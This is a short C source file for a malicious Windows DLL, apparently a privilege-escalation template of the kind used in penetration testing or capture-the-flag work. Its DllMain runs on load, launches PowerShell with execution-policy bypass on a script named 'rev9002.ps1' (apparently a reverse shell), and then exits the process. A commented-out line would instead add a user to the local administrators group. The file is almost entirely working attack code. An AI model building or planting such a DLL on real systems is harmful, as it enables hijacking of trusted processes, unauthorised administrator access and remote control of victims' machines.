// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        /* system("cmd.exe /k net localgroup administrators user /add"); */
        system("powershell -nop -ep bypass -c C:\\Users\\user\\Desktop\\Tools\\rev9002.ps1");
        ExitProcess(0);
    }
    return TRUE;
}
